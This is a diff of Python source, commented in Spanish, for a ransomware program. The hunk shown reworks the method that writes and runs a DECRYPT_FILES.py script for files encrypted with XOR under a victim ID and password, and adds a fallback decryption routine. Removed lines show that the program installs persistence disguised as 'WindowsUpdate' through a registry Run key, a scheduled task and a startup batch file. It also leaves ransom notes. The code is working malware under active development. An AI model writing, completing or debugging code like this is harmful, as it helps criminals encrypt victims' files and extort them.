@@ -457,115 +457,156 @@ Ingrese la clave de descifrado:
         return self.simple_encrypt(data, key)  # XOR es reversible
 
     def start_decryption(self):
-        """Inicia el proceso de descifrado"""
+        """Inicia el proceso de descifrado - VERSIÓN SIMPLIFICADA Y FUNCIONAL"""
         try:
-            # Script de descifrado CORREGIDO con encoding UTF-8
-            decrypt_script = '''# -*- coding: utf-8 -*-
+            # Crear un script de descifrado más simple y directo
+            decrypt_content = f'''# -*- coding: utf-8 -*-
 import os
-import winreg
-import subprocess
+import sys
 
-VICTIM_ID = "{victim_id}"
-PASSWORD = "{password}"
+# Credenciales
+PASSWORD = "{self.password}"
+VICTIM_ID = "{self.victim_id}"
 
-def simple_decrypt(data, key):
-    """Descifrado simple XOR con la clave"""
-    decrypted = bytearray()
-    key_bytes = key.encode()
-    for i, byte in enumerate(data):
-        decrypted.append(byte ^ key_bytes[i % len(key_bytes)])
-    return bytes(decrypted)
+def decrypt_file(encrypted_path, password):
+    """Descifra un archivo individual"""
+    try:
+        # Verificar que el archivo existe
+        if not os.path.exists(encrypted_path):
+            return False
+            
+        # Leer archivo cifrado
+        with open(encrypted_path, 'rb') as f:
+            encrypted_data = f.read()
+        
+        # Descifrar datos
+        decrypted_data = bytearray()
+        key_bytes = password.encode()
+        for i, byte in enumerate(encrypted_data):
+            decrypted_data.append(byte ^ key_bytes[i % len(key_bytes)])
+        
+        # Restaurar archivo original
+        original_path = encrypted_path[:-10]  # Quitar .ENCRYPTED
+        with open(original_path, 'wb') as f:
+            f.write(decrypted_data)
+        
+        # Eliminar archivo cifrado
+        os.remove(encrypted_path)
+        return True
+        
+    except Exception as e:
+        print(f"Error descifrando {{encrypted_path}}: {{e}}")
+        return False
 
 def main():
-    print("Iniciando descifrado de archivos...")
-    print(f"ID Victima: {VICTIM_ID}")
+    print("=== INICIANDO DESCIFRADO ===")
+    print(f"ID Víctima: {{VICTIM_ID}}")
+    print("Buscando archivos cifrados...")
     
-    # Descifrar archivos
+    # Buscar archivos .ENCRYPTED en todo el sistema de archivos
     encrypted_files = []
-    for root, dirs, files in os.walk(os.path.expanduser("~")):
+    start_path = os.path.expanduser("~")
+    
+    for root, dirs, files in os.walk(start_path):
         for file in files:
             if file.endswith('.ENCRYPTED'):
-                encrypted_files.append(os.path.join(root, file))
+                full_path = os.path.join(root, file)
+                encrypted_files.append(full_path)
     
+    print(f"Encontrados {{len(encrypted_files)}} archivos cifrados")
+    
+    # Descifrar archivos
     success_count = 0
-    for enc_file in encrypted_files:
-        try:
-            # Leer archivo cifrado
-            with open(enc_file, 'rb') as f:
-                encrypted_data = f.read()
-            
-            # Descifrar datos
-            decrypted_data = simple_decrypt(encrypted_data, PASSWORD)
-            
-            # Escribir archivo descifrado
-            original_file = enc_file[:-10]  # Remover .ENCRYPTED
-            with open(original_file, 'wb') as f:
-                f.write(decrypted_data)
-            
-            # Eliminar archivo cifrado
-            os.remove(enc_file)
-            
+    for i, encrypted_file in enumerate(encrypted_files):
+        print(f"Descifrando [{{i+1}}/{{len(encrypted_files)}}]: {{os.path.basename(encrypted_file)}}")
+        
+        if decrypt_file(encrypted_file, PASSWORD):
             success_count += 1
-            print(f"[+] Recuperado: {os.path.basename(original_file)}")
-            
-        except Exception as e:
-            print(f"[-] Error con {os.path.basename(enc_file)}: {e}")
+            print(f"  ✓ OK")
+        else:
+            print(f"  ✗ ERROR")
     
-    # Remover persistencia
-    print("\\n[*] Removiendo persistencia...")
-    try:
-        # Registro
-        key = winreg.HKEY_CURRENT_USER
-        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
-            try:
-                winreg.DeleteValue(reg_key, "WindowsUpdate")
-                print("[+] Persistencia del registro removida")
-            except:
-                pass
-        
-        # Tarea programada
-        os.system('schtasks /delete /tn "WindowsUpdateTask" /f 2>nul')
-        print("[+] Tarea programada removida")
-        
-        # Startup
-        startup_folder = os.path.join(
-            os.path.expanduser("~"),
-            'AppData', 'Roaming', 'Microsoft', 'Windows',
-            'Start Menu', 'Programs', 'Startup'
-        )
-        bat_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
-        if os.path.exists(bat_path):
-            os.remove(bat_path)
-            print("[+] Archivo de startup removido")
-        
-        # Archivos temporales
-        files_to_remove = ["LEAME_URGENTE.txt", "INSTRUCCIONES.txt", "CLAVE_MAESTRA.txt"]
-        for file in files_to_remove:
+    # Limpiar archivos de rescate
+    print("\\\\nLimpiando archivos de rescate...")
+    files_to_remove = [
+        "LEAME_URGENTE.txt", "INSTRUCCIONES.txt", "CLAVE_MAESTRA.txt",
+        "DECRYPT_FILES.py"
+    ]
+    
+    for file in files_to_remove:
+        try:
             if os.path.exists(file):
                 os.remove(file)
-                print(f"[+] Archivo {file} removido")
-                
-    except Exception as e:
-        print(f"[-] Error removiendo persistencia: {e}")
+                print(f"Removido: {{file}}")
+        except:
+            pass
     
-    print(f"\\n[+] PROCESO COMPLETADO!")
-    print(f"[*] Archivos recuperados: {success_count}/{len(encrypted_files)}")
-    print("\\n[+] Sistema completamente recuperado!")
-    input("Presione Enter para salir...")
+    # Resultado final
+    print(f"\\\\n=== DESCIFRADO COMPLETADO ===")
+    print(f"Archivos recuperados: {{success_count}}/{{len(encrypted_files)}}")
+    print("\\\\nEl sistema ha sido recuperado exitosamente.")
+    input("Presione Enter para cerrar...")
 
 if __name__ == "__main__":
     main()
-'''.format(victim_id=self.victim_id, password=self.password)
+'''
 
+            # Guardar y ejecutar script de descifrado
             with open('DECRYPT_FILES.py', 'w', encoding='utf-8') as f:
-                f.write(decrypt_script)
-                
+                f.write(decrypt_content)
+            
+            print("[+] Script de descifrado creado correctamente")
             print("[+] Ejecutando descifrado...")
-            subprocess.Popen([sys.executable, 'DECRYPT_FILES.py'])
+            
+            # Ejecutar el descifrado
+            subprocess.Popen([sys.executable, 'DECRYPT_FILES.py'], 
+                           stdout=subprocess.PIPE, 
+                           stderr=subprocess.PIPE)
             
         except Exception as e:
-            print(f"Error iniciando descifrado: {e}")
+            print(f"[-] Error en el descifrado: {e}")
+            # Intentar método alternativo
+            self.alternative_decryption()
+
+    def alternative_decryption(self):
+        """Método alternativo de descifrado directo"""
+        try:
+            print("[*] Intentando descifrado directo...")
+            
+            # Buscar y descifrar archivos directamente
+            start_path = os.path.expanduser("~")
+            decrypted_count = 0
+            
+            for root, dirs, files in os.walk(start_path):
+                for file in files:
+                    if file.endswith('.ENCRYPTED'):
+                        encrypted_path = os.path.join(root, file)
+                        
+                        try:
+                            # Leer archivo cifrado
+                            with open(encrypted_path, 'rb') as f:
+                                encrypted_data = f.read()
+                            
+                            # Descifrar
+                            decrypted_data = self.simple_decrypt(encrypted_data, self.password)
+                            
+                            # Restaurar archivo original
+                            original_path = encrypted_path[:-10]  # Quitar .ENCRYPTED
+                            with open(original_path, 'wb') as f:
+                                f.write(decrypted_data)
+                            
+                            # Eliminar archivo cifrado
+                            os.remove(encrypted_path)
+                            decrypted_count += 1
+                            print(f"[+] Descifrado: {file}")
+                            
+                        except Exception as e:
+                            print(f"[-] Error con {file}: {e}")
+            
+            print(f"[+] Descifrado completado: {decrypted_count} archivos recuperados")
+            
+        except Exception as e:
+            print(f"[-] Error en descifrado alternativo: {e}")
 
     def execute_ransomware(self):
         """Ejecuta el ransomware completo"""
